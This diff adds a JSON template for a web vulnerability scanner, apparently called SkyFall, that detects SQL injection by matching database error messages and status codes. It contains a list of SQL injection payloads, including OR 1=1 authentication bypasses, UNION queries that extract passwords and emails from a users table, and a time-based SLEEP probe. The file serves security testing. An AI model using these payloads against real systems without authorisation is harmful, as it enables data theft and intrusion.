@@ -1,0 +1,43 @@
+{
+    "id": "sqli",
+    "info": "An SQLi injection involves attacker sending SQL queries to the database server.",
+    "severity": "high",
+    "request": {
+        "path":"/",
+        "method": "GET",
+        "redirects": "",
+        "headers": {
+            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+            "Accept-Encoding": "gzip, deflate",
+            "Accept-Language": "en-US,en;q=0.5",
+            "Connection": "keep-alive",
+            "User-Agent": "SkyFall Scanner"
+        }
+    },
+    "stopAtMatch": true,
+    "matchers-condition": "or",
+    "matches": [
+        {
+            "type": "regex",
+            "part": "body",
+            "regex": "mysql_fetch_|not a valid MySQL|not a legal PLSQL identifer|mysql_connect\\(\\)|(SELECT\\s+[^:>]+\\sFROM\\s+[^:>]+\\sWHERE\\s+)|(at\\s[[:alnum:]\\/\\._]+\\sline\\s\\d+)|ociparse\\(\\):|must be a syntactically valid variable|CFSQLTYPE|Unknown column '|Microsoft OLE DB Provider for SQL|SQL QUERY FAILURE:|Syntax error.{1,50}in query|You have an error in your SQL syntax|Unclosed quotation mark"
+        },
+        {
+            "type": "status",
+            "code": [302,500,404,403,504],
+            "condition": "or"
+        }
+
+    ],
+    "payloads": [
+        "'+OR+1=1--",
+        "%27+OR+1=1--",
+        "1 UNION SELECT * FROM users WHERE id = 1--",
+        "'+UNION+SELECT+NULL,NULL--",
+        "1 UNION SELECT password FROM users WHERE username = 'admin'--",
+        "1 UNION SELECT email FROM users WHERE id = 1--",
+        "1 OR 1=1--",
+        "1' AND SLEEP(5)--",
+        "' OR 1=1 LIMIT 1 OFFSET 0--"
+    ]
+}
